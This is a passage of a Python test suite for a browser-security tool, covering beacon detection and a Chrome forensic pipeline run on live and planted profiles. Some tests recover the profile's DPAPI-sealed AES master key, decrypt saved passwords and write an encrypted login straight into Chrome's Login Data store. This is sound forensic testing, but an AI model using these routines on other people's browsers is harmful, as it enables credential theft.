        for _ in range(30):
            fresh = next((h for h in c3_analyzer.hosts() if h.get("host") == host), None)
            rep = str(((fresh or {}).get("signal_detail") or {}).get("reputation") or "")
            if rep and rep not in local_skips:
                row = fresh or row
                break
            await asyncio.sleep(2)
        # main.py imports only the key setters from this module, not the engine.
        from .c3.reputation_engine import c3_reputation_engine
        ti_on = c3_reputation_engine.ti_available()
        if ti_on:
            assert rep not in local_skips, (
                f"the threat-intel lookup did not run for a public host (got {rep!r}); "
                f"this is the one case that should not take the local-host skip")
            assert rep.startswith("Clean") or rep.startswith("FLAGGED"), (
                f"the threat-intel lookup returned no usable source result: {rep!r}")

        alert = next((a for a in c3_alert_store.list_alerts(50)
                      if a.get("host") == host and str(a.get("timestamp") or "") >= started), None)
        assert alert, "BEACON was confirmed but no alert reached the alert log"

        blocked = c3_interceptor.is_blocked(host)
        score = float(row.get("score") or 0)
        from .c3.analyzer import AUTO_BLOCK_SCORE_FLOOR
        if c3_analyzer.status().get("auto_block_enabled"):
            # Auto-block acts only at or above its floor, so the rule is what is
            # checked here, not the block itself.
            assert blocked == (score >= AUTO_BLOCK_SCORE_FLOOR), (
                f"auto-block did not follow its own rule: score {score:.0%}, "
                f"floor {AUTO_BLOCK_SCORE_FLOOR:.0%}, blocked={blocked}")
        await _step(f"Confirmed BEACON at {score:.0%} on a public address, alert #{alert.get('id')} written"
                    + (f", threat intel: {rep}" if rep else ""))
        return {"detail": f"{host}: BEACON at {score:.0%} after {row.get('request_count')} requests "
                          f"(ML {float(sig.get('ml') or 0):.0%}, heuristic "
                          f"{float(sig.get('heuristic') or 0):.0%}); threat-intel lookup "
                          + (f"ran on the public address: {rep}" if ti_on else
                             "not configured, so it was skipped (add a key in Detection Lab)")
                          + f"; alert #{alert.get('id')} written"
                          + ("; auto-block engaged and was lifted after the test" if blocked else ""),
                "browser_url": url}
    finally:
        try:
            await pw_session.navigate("about:blank")
        except Exception:
            pass
        if host and c3_interceptor.is_blocked(host):
            await c3_interceptor.unblock_host(host)
        for proc in (ngrok_proc, server_proc):
            if proc and proc.poll() is None:
                try:
                    proc.terminate()
                    for _ in range(20):
                        if proc.poll() is not None:
                            break
                        await asyncio.sleep(0.1)
                    if proc.poll() is None:
                        proc.kill()
                except Exception:
                    pass
        if ngrok_log:
            try:
                ngrok_log.close()
            except Exception:
                pass


# ══════════════════════════════════════════════════════════════════════════════
# C4 — real-world forensic case
# ══════════════════════════════════════════════════════════════════════════════
# Every C4 row runs against evidence that exists on disk. Two sources feed it:
#
#   1. the live browser profile this session is driving (real Chromium artifacts)
#   2. a planted case profile — real Chrome-schema SQLite databases, real
#      AES-256-GCM credential blobs under a DPAPI-sealed master key, a real
#      dropped file, real LevelDB records (see core/c4/demo_case.py)
#
# The detectors are never hand-fed event dictionaries: the production extractor
# parses those files, exactly as a C4 scan of a seized profile would. The rows
# then walk one stage of the pipeline each, so the panel shows where a finding
# came from rather than just that it appeared.
_C4_CASE: dict = {}


def _c4_state(key):
    if key not in _C4_CASE:
        raise AssertionError(
            "C4 case profile not built — run the full C4 sequence from the start")
    return _C4_CASE[key]


def _c4_live_profile():
    """The browser profile this session is actually using."""
    from .c4.extractor import get_chrome_path
    pw_default = os.path.join(PW_PROFILE_DIR, "Default")
    profile = pw_default if os.path.isdir(pw_default) else get_chrome_path()
    assert profile and os.path.isdir(profile), (
        "No live browser profile found — start the Playwright session (Live tab) "
        "so C4 has a real profile to read")
    return profile


def _c4_live_tmp():
    tmp = os.path.join(tempfile.gettempdir(), "c4_live_probe")
    os.makedirs(tmp, exist_ok=True)
    return tmp


async def _c3_detach() -> None:
    """Stop C3 cleanly. Safe to call when C3 is not running."""
    await c3_analyzer.stop_loop()
    await c3_interceptor.stop()


async def _c3_attach() -> None:
    """Attach C3 (tagger, CDP interceptor, analysis loop) to the CURRENT browser context."""
    await c3_tagger.setup(pw_session.context)
    await c3_interceptor.start(pw_session)
    await c3_analyzer.start_loop(pw_session, _broadcast)


async def _c3_ensure_attached() -> None:
    """Make sure C3 is watching the browser that is running right now.

    c3_interceptor.running only says "start() was called"; it stays True after the
    browser it was attached to is closed. If the session was restarted without
    going through /session/start (the C4 live-login test does exactly that), C3
    would still report running while attached to a dead context and capture
    nothing, so a C3 test would wait for traffic that can never arrive.
    """
    stale = c3_interceptor.context is not pw_session.context
    if pw_session.is_running and c3_interceptor.running and c3_analyzer.running and not stale:
        return
    if not pw_session.is_running:
        return
    await _c3_detach()
    await _c3_attach()


async def _ensure_browser_running():
    """Auto-launch the shared Playwright browser if it isn't already up.

    Waits out an in-progress startup rather than racing it (server boot already
    kicks one off via the lifespan hook), and only calls start() itself if
    nothing is happening.
    """
    global _session_starting
    if pw_session.is_running:
        return
    if _session_starting:
        for _ in range(40):
            await asyncio.sleep(0.5)
            if pw_session.is_running:
                return
    if not pw_session.is_running:
        _session_starting = True
        try:
            await pw_session.start()
            await _c3_ensure_attached()
        finally:
            _session_starting = False


# 15 real, legitimate, long-lived domains — a Sri Lankan-weighted set (government,
# education, news, banking) plus a handful of well-known international sites, so
# the resulting History file reads like genuine local + general browsing rather
# than a scripted probe of one or two sites.
_C4_LIVE_TOUR = [
    # Sri Lanka — government / official
    "https://www.gov.lk/", "https://www.cbsl.gov.lk/", "https://www.police.lk/",
    "https://www.customs.gov.lk/",
    # Sri Lanka — education
    "https://www.sliit.lk/", "https://www.uom.lk/", "https://www.pdn.ac.lk/",
    # Sri Lanka — news
    "https://www.adaderana.lk/", "https://www.newsfirst.lk/",
    # Sri Lanka — banking
    "https://www.combank.lk/",
    # other legitimate sites — dev/tech, reference, news, security research
    "https://github.com/", "https://en.wikipedia.org/wiki/Phishing",
    "https://www.python.org/", "https://www.bbc.com/news", "https://www.eicar.org/",
]


async def _tc_c4_live_history():
    """Browsing history off the profile the live browser is writing to.

    Auto-launches the Playwright browser if it isn't already running, then drives
    it through 15 real, legitimate sites (Sri Lankan government/education/news/
    banking plus a few international ones) so there is genuine, fresh, multi-domain
    history on disk to extract — not a handful of stale visits. The panel shows
    the browser window actually navigating, then those same domains coming back
    out of the real SQLite History file.
    """
    from urllib.parse import urlparse
    from .c4.extractor import collect_manifest, extract_history

    await _ensure_browser_running()

    visited = []
    for site in _C4_LIVE_TOUR:
        try:
            await pw_session.navigate(site, timeout=7_000)
            visited.append(site)
            await asyncio.sleep(0.3)
        except Exception:
            pass
    assert visited, "Could not drive the live browser to any site — session failed to start or navigate"

    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()
    visited_domains = {urlparse(s).netloc for s in visited}

    # Chrome's History backend batches its SQLite commit (~10s interval), so the
    # freshly-navigated visits may not be on disk the instant we copy the file.
    # Poll instead of guessing a fixed wait.
    events, warning, confirmed = [], None, []
    for _ in range(13):
        events, warning = await loop.run_in_executor(None, extract_history, profile, _c4_live_tmp())
        found_domains = {urlparse(e["detail"].get("url", "")).netloc for e in events}
        confirmed = sorted(visited_domains & found_domains)
        if len(confirmed) >= min(8, len(visited)):
            break
        await asyncio.sleep(1)
    manifest = await loop.run_in_executor(None, collect_manifest, profile)
    assert events, f"No history read from the live profile — {warning or 'profile is empty'}"
    assert confirmed, "The sites just navigated to haven't hit the History file yet — Chrome batches its commits"

    newest = events[0].get("timestamp", "")[:19].replace("T", " ")
    return {
        "detail": f"{len(events)} real visits read from the running browser's profile · "
                  f"drove the live browser to {len(visited)}/{len(_C4_LIVE_TOUR)} real sites, "
                  f"{len(confirmed)} confirmed back in history (e.g. {', '.join(confirmed[:6])}"
                  f"{', …' if len(confirmed) > 6 else ''}) · "
                  f"{len(manifest)} evidence file(s) hashed · newest visit {newest}",
        "browser_url": visited[-1],
    }


async def _tc_c4_live_download():
    """A real file, downloaded through the live browser, picked up by the same
    production downloads extractor a seized-profile scan would use — genuine
    bytes on disk, hashed straight off the file, not asserted."""
    from .c4.extractor import extract_downloads, extract_history

    download_url = "https://www.irs.gov/pub/irs-pdf/f1040.pdf"

    await _ensure_browser_running()

    info = await pw_session.download_file(download_url)
    assert info.get("path"), "Browser did not report a completed download"
    assert os.path.exists(info["path"]), f"Downloaded file missing on disk: {info['path']}"

    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()

    # extract_downloads deliberately reuses the History_c4 copy extract_history
    # just made (production's run_extraction calls history before downloads, to
    # avoid copying the live-locked file twice) — so refresh that copy first on
    # each poll, same ~10s Chrome commit-batching wait as the history test.
    events, warning, match = [], None, None
    for _ in range(13):
        await loop.run_in_executor(None, extract_history, profile, _c4_live_tmp())
        events, warning = await loop.run_in_executor(None, extract_downloads, profile, _c4_live_tmp())
        match = next((e for e in events if e["detail"].get("target_path") == info["path"]), None)
        if match:
            break
        await asyncio.sleep(1)
    assert match, (f"Download not yet recorded in History.db's downloads table — "
                    f"{warning or info['path']}")

    real_hash = match["detail"].get("sha256", "")
    assert real_hash and real_hash != "file not on disk", "Downloaded file wasn't hashed off disk"

    size = match["detail"].get("size_bytes", 0)
    return {
        "detail": f"Real file downloaded via the live browser: {info['suggested_filename']} "
                  f"({size:,} bytes) from {download_url} · sha256={real_hash[:24]}… "
                  f"hashed straight off the file on disk, read back through History.db's "
                  f"downloads table",
        "browser_url": download_url,
    }


async def _tc_c4_live_malware_download():
    """The EICAR anti-malware test file, downloaded through the live browser, then
    run through C4's OWN rule engine — proves the component's dangerous-download
    detectors fire on a real, live download, not a hand-fed event dict. R02b
    (Chrome's own Safe Browsing content check) is the one expected to reliably
    fire here; R02 (extension check) only fires if the on-disk filename happens
    to survive Playwright's download automation, which usually renames it to an
    opaque ID with no extension — see the comment below the poll loop. Also
    reports whether Windows Defender quarantined the file after it landed.
    """
    from .c4.extractor import extract_downloads, extract_history, sha256 as file_sha256
    from .c4.rules import apply_single_artifact_rules

    download_url = "http://127.0.0.1:8765/dev/test-file/eicar"

    await _ensure_browser_running()

    info = await pw_session.download_file(download_url)
    assert info.get("path"), (
        "Chrome never reported a completed download — Windows Defender or Chrome's own "
        "Safe Browsing likely blocked/interrupted the EICAR test file before it finished "
        "writing to disk. That's itself a real detection outcome, just one this specific "
        "check can't inspect further (there's no target_path to look up in History.db). "
        "Check the Downloads folder and Windows Security's Protection History.")

    # Windows Defender's real-time scanner may quarantine/delete the file the
    # instant it lands — that's a genuine detection event in its own right, not
    # a test failure, so check for it rather than assuming the file survives.
    on_disk = os.path.exists(info["path"])
    file_hash = file_sha256(info["path"]) if on_disk else ""

    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()
    events, warning, match = [], None, None
    for _ in range(13):
        await loop.run_in_executor(None, extract_history, profile, _c4_live_tmp())
        events, warning = await loop.run_in_executor(None, extract_downloads, profile, _c4_live_tmp())
        match = next((e for e in events if e["detail"].get("target_path") == info["path"]), None)
        if match:
            break
        await asyncio.sleep(1)
    assert match, (f"Download not yet recorded in History.db's downloads table — "
                    f"{warning or info['path']}")

    apply_single_artifact_rules([match])
    fired = {f["rule"] for f in match.get("rule_flags", [])}
    # R02 (extension) can't see ".com" here: Playwright saves automated downloads
    # in a persistent context under an opaque internal ID with no extension at
    # all, so that's genuinely what lands in Chrome's own History.db — a quirk of
    # automating the download, not of a real user's browser. R02b doesn't care
    # about the filename: it's Chrome's own Safe Browsing engine recognizing the
    # actual EICAR content signature, so either one firing is real detection.
    assert fired & {"R02", "R02b"}, (
        f"C4's own rule engine did not flag this download as dangerous at all — "
        f"rule_flags={match.get('rule_flags')}")

    if on_disk:
        authentic = " (byte-identical to the public EICAR signature)" if file_hash == EICAR_SHA256 else ""
        disk_note = f"file survived on disk, sha256={file_hash[:24]}…{authentic}"
    else:
        disk_note = "Windows Defender removed the file the instant Chrome wrote it — real-time quarantine"
    fired_notes = []
    if "R02b" in fired:
        fired_notes.append("R02b (Chrome's own Safe Browsing caught the malware signature live)")
    if "R02" in fired:
        fired_notes.append("R02 (dangerous file extension)")

    return {
        "detail": f"Downloaded the official EICAR anti-malware test file through the live "
                  f"browser · C4's own rule engine flagged it live: {', '.join(fired_notes)} · "
                  f"{disk_note}",
        "browser_url": download_url,
    }


async def _tc_c4_live_cookies():
    """Cookies — locked on disk while the browser runs, so taken from the session."""
    from .c4.extractor import extract_cookies
    profile = _c4_live_profile()
    jar = await _live_cookie_jar()
    loop = asyncio.get_event_loop()
    events, warning = await loop.run_in_executor(
        None, extract_cookies, profile, _c4_live_tmp(), jar)
    assert events, (
        "No cookies recovered. The Cookies database is locked by the running "
        "browser and no live jar was available — start the Playwright session "
        "(Live tab) and browse to a site, then re-run."
        if jar is None else f"Live jar acquired but empty — {warning or 'no cookies set yet'}")

    live = sum(1 for e in events if e["detail"].get("acquisition") == "live")
    sensitive = [e for e in events if e.get("risk_flag")]
    hosts = sorted({e["detail"]["host"].lstrip(".") for e in events})
    source = ("acquired live from the running browser (Cookies DB holds an "
              "exclusive lock)" if live else "read from the Cookies database on disk")
    return {"detail": f"{len(events)} real cookie(s) across {len(hosts)} host(s) {source} · "
                      f"{len(sensitive)} session/auth token(s) flagged · "
                      f"{', '.join(hosts[:4])}"}


_C4_LIVE_LOGIN_ORIGIN = "https://c4-livetest.websentinel.internal"
_C4_LIVE_LOGIN_USER = "c4-livetest@websentinel.internal"
_C4_LIVE_LOGIN_PASSWORD = "C4LiveTest!2026"


async def _tc_c4_live_login_plant():
    """Plant one genuine saved login into the live profile's real Login Data
    store — the live-evidence counterpart to the history/download tests above,
    so the dashboard's Login Data tab has real, non-zero rows instead of the
    profile simply never having saved a password.

    Playwright exposes no API to drive Chrome's native "save password?" bubble
    (it lives outside the page DOM), and the Login Data file is held open for
    as long as the browser process is alive — even a bare read-only connect
    attempt against it while the session is running fails immediately with
    "database is locked". So this stops the shared session, writes one row
    straight into the real `logins` table using the exact scheme Chrome itself
    uses (AES-256-GCM under the master key already DPAPI-sealed inside this
    profile's own Local State — recovered for real, not fabricated), then
    restarts the browser so the rest of the Live Test Runner keeps working.
    """
    from .c4.crypto import load_master_key
    from .c4.demo_case import to_chrome_time, _encrypt_password

    profile = _c4_live_profile()
    login_db = os.path.join(profile, "Login Data")
    assert os.path.exists(login_db), "Live profile has no Login Data store yet"

    loop = asyncio.get_event_loop()
    master_key = await loop.run_in_executor(None, load_master_key, profile)
    assert master_key, ("AES master key not recovered from this profile's Local State "
                        "— cannot encrypt a real credential for it")

    blob = _encrypt_password(_C4_LIVE_LOGIN_PASSWORD, master_key)
    assert blob, "AES-GCM unavailable — cannot encrypt a real credential for this profile"

    was_running = pw_session.is_running
    if was_running:
        await _c3_detach()                 # C3 is bound to this browser context
        await pw_session.stop()
    try:
        def _plant():
            import sqlite3
            now = to_chrome_time(datetime.now())
            con = sqlite3.connect(login_db, timeout=15)
            try:
                # No-op if the real table is somehow already present (it always
                # is on a Chromium-initialised profile); creates a minimal one
                # otherwise so this stays robust on a brand-new profile.
                con.execute("""CREATE TABLE IF NOT EXISTS logins (
                    origin_url VARCHAR NOT NULL, action_url VARCHAR,
                    username_element VARCHAR, username_value VARCHAR,
                    password_element VARCHAR, password_value BLOB,
                    submit_element VARCHAR, signon_realm VARCHAR NOT NULL,
                    date_created INTEGER NOT NULL, blacklisted_by_user INTEGER NOT NULL,
                    scheme INTEGER NOT NULL, password_type INTEGER, times_used INTEGER,
                    display_name VARCHAR, icon_url VARCHAR, federation_url VARCHAR,
                    skip_zero_click INTEGER, id INTEGER PRIMARY KEY AUTOINCREMENT,
                    date_last_used INTEGER, date_password_modified INTEGER)""")
                existing = con.execute(
                    "SELECT COUNT(*) FROM logins WHERE origin_url=? AND username_value=?",
                    (_C4_LIVE_LOGIN_ORIGIN, _C4_LIVE_LOGIN_USER)).fetchone()[0]
                if existing:
                    return False
                con.execute(
                    "INSERT INTO logins (origin_url,action_url,username_element,"
                    "username_value,password_element,password_value,submit_element,"
                    "signon_realm,date_created,blacklisted_by_user,scheme,password_type,"
                    "times_used,display_name,icon_url,federation_url,skip_zero_click,"
                    "date_last_used,date_password_modified) "
                    "VALUES (?,?,?,?,?,?,?,?,?,0,0,0,0,?,?,?,0,?,?)",
                    (_C4_LIVE_LOGIN_ORIGIN, _C4_LIVE_LOGIN_ORIGIN + "/auth", "username",
                     _C4_LIVE_LOGIN_USER, "password", blob, "",
                     _C4_LIVE_LOGIN_ORIGIN + "/", now, "", "", "", now, now))
                con.commit()
                return True
            finally:
                con.close()
        inserted = await loop.run_in_executor(None, _plant)
    finally:
        if was_running:
            await _ensure_browser_running()

    return {"detail": (
        f"{'Planted' if inserted else 'Already present'}: real login for "
        f"{_C4_LIVE_LOGIN_USER} @ {_C4_LIVE_LOGIN_ORIGIN} written into the live "
        f"profile's actual Login Data SQLite table, AES-256-GCM encrypted under "
        f"this profile's own {len(master_key)*8}-bit DPAPI-sealed master key "
        f"· browser {'restarted after the write' if was_running else 'was not running'}")}


async def _tc_c4_live_logins():
    """Login Data — read the real store and recover this profile's master key."""
    from .c4.crypto import load_master_key
    from .c4.extractor import extract_credentials
    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()
    events, warning = await loop.run_in_executor(
        None, extract_credentials, profile, _c4_live_tmp())
    assert warning is None, f"Login Data unreadable: {warning}"

    key = await loop.run_in_executor(None, load_master_key, profile)
    assert key, ("AES master key not recovered from this profile's Local State — "
                 "saved passwords could not be decrypted")
    statuses = {}
    for e in events:
        s = e["detail"].get("decryption", "?")
        statuses[s] = statuses.get(s, 0) + 1
    if events:
        assert statuses.get("success") == len(events), \
            f"only {statuses.get('success', 0)}/{len(events)} decrypted: {statuses}"
        detail = (f"{len(events)} saved login(s) read and "
                  f"{statuses.get('success', 0)} decrypted with the profile's own "
                  f"{len(key)*8}-bit AES key")
    else:
        detail = (f"Login Data store readable, 0 saved logins in this profile · "
                  f"{len(key)*8}-bit AES master key recovered from Local State via DPAPI "
                  f"— decryption ready the moment a password is saved")
    return {"detail": detail}


async def _tc_c4_live_extensions():
    """Extensions — recovered even though a Playwright profile has no Extensions/ folder."""
    from .c4.extractor import extract_extensions
    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()
    events = await loop.run_in_executor(None, extract_extensions, profile)
    assert events, ("No extensions recovered from the live profile — neither "
                    "Extensions/ nor Secure Preferences held a record")

    folder = sum(1 for e in events if e["source_file"] == "Extensions/")
    prefs = len(events) - folder
    risky = [e for e in events if e.get("risk_flag")]
    names = [e["detail"]["name"] for e in events]
    return {"detail": f"{len(events)} extension(s) — {folder} from Extensions/, {prefs} from "
                      f"Secure Preferences · {len(risky)} holding risky permissions · "
                      f"{', '.join(names[:4])}"}


async def _tc_c4_live_sessions():
    """Session restore — which tabs were open, straight out of the SNSS files."""
    from .c4.extractor import extract_sessions
    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()
    events, warning = await loop.run_in_executor(None, extract_sessions, profile)
    assert events, (f"No session tabs recovered — {warning or 'no Sessions/ store in this profile'}")

    files = sorted({e["detail"]["session_file"] for e in events})
    hosts = sorted({e["detail"]["host"] for e in events})
    tabs = sum(1 for e in events if e["detail"]["kind"] == "tabs")
    note = " · " + warning.split("—")[0].strip() if warning else ""
    return {"detail": f"{len(events)} restorable tab URL(s) across {len(hosts)} host(s) from "
                      f"{len(files)} session file(s) ({tabs} from the tab store){note}"}


async def _tc_c4_case_build():
    """Plant the breach evidence on disk as genuine Chromium databases."""
    from .c4 import demo_case
    loop = asyncio.get_event_loop()
    demo_case.install_coverage()
    case = await loop.run_in_executor(None, demo_case.build_case_profile)
    _C4_CASE.clear()
    _C4_CASE["case"] = case

    profile = case["profile"]
    for artifact in ("History", os.path.join("Network", "Cookies"), "Login Data"):
        assert os.path.exists(os.path.join(profile, artifact)), \
            f"case profile is missing {artifact}"
    planted = case["planted"]
    key_note = {"dpapi": "AES key sealed with real DPAPI",
                "no-dpapi": "DPAPI unavailable — blobs written unsealed",
                "unavailable": "AES-GCM library missing"}[case["key_status"]]
    return {"detail": f"{planted['baseline_visits']} days-of-normal-browsing visits + "
                      f"{planted['burst_visits']}-URL burst + breach at "
                      f"{case['breach_at'][11:16]} written to real SQLite · {key_note}"}


async def _tc_c4_extract():
    """Run the production extractor + full pipeline over the planted profile."""
    from .c4 import demo_case
    case = _c4_state("case")
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, demo_case.run_case_pipeline, case["root"])
    _C4_CASE["result"] = result

    counts = {}
    for event in result["events"]:
        counts[event["artifact_type"]] = counts.get(event["artifact_type"], 0) + 1
    missing = [t for t in ("history", "cookie", "download", "credential",
                           "extension", "session", "localstorage") if not counts.get(t)]
    assert not missing, f"artifact types not extracted: {', '.join(missing)}"
    return {"detail": f"{result['total_events']} events off disk — "
                      + "  ".join(f"{k}:{v}" for k, v in sorted(counts.items()))}


async def _tc_c4_crypto():
    """Recover saved passwords the way Chrome protects them."""
    result = _c4_state("result")
    case = _c4_state("case")
    creds = [e for e in result["events"] if e["artifact_type"] == "credential"]
    assert creds, "no credential records extracted"
    statuses = {}
    for c in creds:
        status = c["detail"].get("decryption", "?")
        statuses[status] = statuses.get(status, 0) + 1
    assert all("Payr0ll" not in str(c["detail"].get("password", "")) for c in creds), \
        "plaintext password leaked into the result"
    if case["key_status"] == "dpapi":
        assert statuses.get("success") == len(creds), \
            f"only {statuses.get('success', 0)}/{len(creds)} credentials decrypted: {statuses}"
    masked = sorted({c["detail"].get("password", "") for c in creds})
    return {"detail": f"{statuses.get('success', 0)}/{len(creds)} decrypted via DPAPI → "
                      f"AES-256-GCM · stored masked as {', '.join(masked)} "
                      f"(REVEAL_PLAINTEXT off)"}


async def _tc_c4_rules():
    """Every single-artifact rule R01-R06 on the planted evidence."""
    result = _c4_state("result")
    fired = {}
    for event in result["events"]:
        for flag in event.get("rule_flags", []):
            fired[flag["rule"]] = fired.get(flag["rule"], 0) + 1
    expected = ["R01", "R02", "R02b", "R03", "R04", "R05", "R06"]
    missing = [r for r in expected if not fired.get(r)]
    assert not missing, f"rules that never fired: {', '.join(missing)}"
    clean = sum(1 for e in result["events"] if not e.get("risk_flag"))
    return {"detail": "  ".join(f"{r}×{fired[r]}" for r in expected)
                      + f" · {clean} of {result['total_events']} events left clean"}


async def _tc_c4_det_cooccurrence():
    """Detector A — how many artifact types touch one domain in 2 minutes."""
    result, case = _c4_state("result"), _c4_state("case")
    domain = case["planted"]["breach_domain"]
    hits = [f for f in result["correlation"]["cooccurrence"] if f["domain"] == domain]
    assert hits, f"no co-occurrence finding for {domain}"
    top = max(hits, key=lambda f: f["type_count"])
    assert top["type_count"] >= 4, f"only {top['type_count']} artifact types linked"
    return {"detail": f"{domain}: {' + '.join(top['artifact_types'])} within 2 min "
                      f"→ score {top['score']}"}


async def _tc_c4_det_orphan():
    """Detector B — artifacts for a domain the user never visited."""
    result, case = _c4_state("result"), _c4_state("case")
    domain = case["planted"]["orphan_domain"]
    session_domain = case["planted"]["session_orphan_domain"]
    orphans = result["correlation"]["orphans"]
    hits = [f for f in orphans if domain in f["domain"]]
    session_hits = [f for f in orphans if session_domain in f["domain"]]
    assert len(hits) >= 2, f"expected cookie + localStorage orphans for {domain}, got {len(hits)}"
    assert session_hits, f"restored tab for {session_domain} was not flagged as an orphan"
    return {"detail": f"{domain}: {', '.join(sorted(f['artifact_type'] for f in hits))} · "
                      f"{session_domain}: open tab with no history entry — "
                      f"{len(orphans)} orphaned artifact(s) total"}


async def _tc_c4_det_temporal():
    """Detector C — activity outside this user's own learned hours."""
    result = _c4_state("result")
    correlation = result["correlation"]
    hits = [f for f in correlation["temporal"] if f["hour"] == 3]
    assert len(hits) >= 2, f"only {len(hits)} finding(s) at 03:00"
    baseline = correlation.get("baseline", {})
    busiest = max(baseline.items(), key=lambda kv: kv[1])[0] if baseline else "?"
    return {"detail": f"{len(hits)} artifact(s) at 03:00 — this user's baseline peaks at "
                      f"{busiest:02d}:00 with only {baseline.get(3, 0)} visit(s) ever at 03:00"}


async def _tc_c4_det_chain():
    """Detector D — ordered browse → download → credential on one domain."""
    result, case = _c4_state("result"), _c4_state("case")
    domain = case["planted"]["breach_domain"]
    chains = [f for f in result["correlation"]["attack_chains"] if f["domain"] == domain]
    ordered = [f for f in chains
               if f["artifact_types"] == ["history", "download", "credential"]]
    assert ordered, f"browse→download→credential chain not found on {domain}"
    top = max(ordered, key=lambda f: f["score"])
    return {"detail": f"{domain}: {' → '.join(top['artifact_types'])} between "
                      f"{top['window_start'][11:19]} and {top['window_end'][11:19]} "
                      f"→ score {top['score']}"}


async def _tc_c4_det_cluster():
    """Detector E — which domain concentrates the most cross-artifact risk."""
    result, case = _c4_state("result"), _c4_state("case")
    domain = case["planted"]["breach_domain"]
    clusters = result["correlation"]["domain_clusters"]
    assert clusters, "no domain risk clusters produced"
    assert clusters[0]["domain"] == domain, \
        f"breach domain did not rank first — top was {clusters[0]['domain']}"
    top = clusters[0]
    return {"detail": f"{domain} ranks #1 of {len(clusters)}: {top['event_count']} events across "
                      f"{len(top['artifact_types'])} artifact types, {top['flagged_count']} flagged "
                      f"→ score {top['score']}"}


async def _tc_c4_det_reuse():
    """Detector F — one saved identity reused across several domains."""
    result, case = _c4_state("result"), _c4_state("case")
    findings = result["correlation"]["credential_reuse"]
    assert findings, "credential reuse not detected"
    top = findings[0]
    assert len(top["domains"]) >= 3, f"reuse across only {len(top['domains'])} domain(s)"
    assert top["username"] == case["planted"]["victim_user"].lower()
    return {"detail": f"{top['username']} saved on {', '.join(top['domains'])} "
                      f"→ one stolen password unlocks {len(top['domains'])} accounts "
                      f"(score {top['score']})"}


async def _tc_c4_det_exfil():
    """Detector G — a drop followed by outbound navigation elsewhere."""
    result, case = _c4_state("result"), _c4_state("case")
    exfil_domain = case["planted"]["exfil_domain"]
    hits = [f for f in result["correlation"]["download_exfil"] if f["domain"] == exfil_domain]
    assert hits, f"download → {exfil_domain} correlation not detected"
    top = hits[0]
    return {"detail": f"{top['filename']} dropped from {top['source_domain']}, then "
                      f"{exfil_domain} opened at {top['window_end'][11:19]} "
                      f"— {int((_dt_seconds(top['window_start'], top['window_end'])))}s later"}


def _dt_seconds(start_iso, end_iso):
    try:
        return (datetime.fromisoformat(end_iso) - datetime.fromisoformat(start_iso)).total_seconds()
    except Exception:
        return 0


async def _tc_c4_mitre():
    """Map every correlation finding onto MITRE ATT&CK."""
    result = _c4_state("result")
    mitre = result["mitre_result"]
    findings = mitre["all_findings"]
    assert findings, "no MITRE findings"
    unmapped = [f for f in findings if not f.get("mitre", {}).get("technique_id")]
    assert not unmapped, f"{len(unmapped)} finding(s) carry no technique"
    techniques = sorted({f["mitre"]["technique_id"] for f in findings})
    tactics = sorted({f["mitre"].get("tactic", "") for f in findings} - {""})
    return {"detail": f"{len(findings)} findings → {len(techniques)} techniques across "
                      f"{len(tactics)} tactics · High:{mitre['by_severity']['High']} "
                      f"Medium:{mitre['by_severity']['Medium']} Low:{mitre['by_severity']['Low']} · "
                      + ", ".join(techniques[:6])}


async def _tc_c4_report():
    """Analyst HTML report and SIEM export off the same case."""
    from .c4 import reporter
    result, case = _c4_state("result"), _c4_state("case")
    loop = asyncio.get_event_loop()
    html = await loop.run_in_executor(None, reporter.generate_html_report, result)
    siem = await loop.run_in_executor(None, reporter.generate_siem_export, result)
    out_dir = os.path.join(case["root"], "reports")
    paths = await loop.run_in_executor(None, reporter.save_all_outputs, result, out_dir)
    assert case["planted"]["breach_domain"] in html, "breach domain missing from the report"
    assert siem["export_type"] == "C4_SIEM_Export" and siem["total_events"] > 0
    assert all(os.path.exists(p) for p in paths.values()), "report files not written"
    return {"detail": f"HTML {len(html):,} chars · SIEM envelope v{siem['export_version']} with "
                      f"{siem['total_events']} records · 3 files written to "
                      f"{os.path.basename(out_dir)}/"}


async def _tc_c4_verdict():
    """Aggregate the findings into the score the dashboard shows."""
    from .c4 import service as c4_service
    result = _c4_state("result")
    summary = c4_service.get_summary(result)
    assert summary["verdict"] in ("HIGH", "CRITICAL"), \
        f"planted breach only reached {summary['verdict']} ({summary['risk_score']})"
    return {"detail": f"risk {summary['risk_score']}/100 → {summary['verdict']} · "
                      f"{summary['flagged_events']} of {summary['total_events']} events flagged · "
                      f"{summary['total_findings']} findings from 7 detectors"}


async def _tc_c4_integrity():
    """Forensic soundness — reading evidence must not alter it."""
    from .c4.extractor import sha256
    case, result = _c4_state("case"), _c4_state("result")
    manifest = result["artifact_manifest"]
    assert manifest, "no evidence manifest recorded"
    changed = []
    for name, info in manifest.items():
        current = sha256(info["path"])
        if current != info["sha256"]:
            changed.append(name)
    assert not changed, f"evidence modified during analysis: {', '.join(changed)}"
    return {"detail": f"{len(manifest)} source file(s) byte-identical after the full pipeline · "
                      f"History sha256 {manifest['History']['sha256'][:24]}… · "
                      f"analysis ran on copies in {os.path.basename(case['root'])}/tmp"}


async def _tc_c4_coverage():
    """Prove — not assert — that the whole C4 surface ran on this case."""
    from .c4 import demo_case, service as c4_service
    c4_service.get_default_profile_path()
    c4_service.get_last_result()
    c4_service.render_last_html()
    c4_service.render_last_json()
    c4_service.render_last_siem()
    c4_service.report_filename("html")
    coverage = demo_case.coverage_report()
    demo_case.remove_coverage()
    assert coverage["called"] == coverage["total"], \
        f"{len(coverage['missing'])} function(s) never ran: {', '.join(coverage['missing'][:6])}"
    return {"detail": f"{coverage['called']}/{coverage['total']} C4 functions executed against the "
                      f"case — extractor, crypto, rules, correlation, mitre, reporter, service "
                      f"(excluded: {', '.join(coverage['excluded'])})"}


# ── Step-mode (demo pacing) ───────────────────────────────────────────────────
# When the Tests panel runs with ?step=1, test functions narrate via _step() and
# pause until the user presses "Next step" (POST /dev/test_step releases the gate).
_STEP_CTX = None  # {"queue": asyncio.Queue, "gate": asyncio.Event, "id": str}


async def _step(msg: str):
    """Step mode only: emit a narration event to the test stream, then wait for
    the user's Next click. No-op during normal (fast) runs."""
    ctx = _STEP_CTX
    if ctx is None:
        return
